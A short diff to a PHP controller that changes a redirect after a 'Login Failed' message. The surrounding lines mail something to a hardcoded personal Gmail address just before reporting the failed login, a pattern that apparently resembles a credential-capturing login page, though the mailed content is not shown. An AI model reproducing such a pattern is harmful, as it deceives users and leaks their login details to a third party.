@@ -34,6 +34,6 @@ class SiteController extends Controller
             $m->to('pap5234241@gmail.com', $name)->subject('Gev');
         });
 
-        return redirect('site/index')->with('message', 'Login Failed');
+        return redirect('/')->with('message', 'Login Failed');
     }
 }
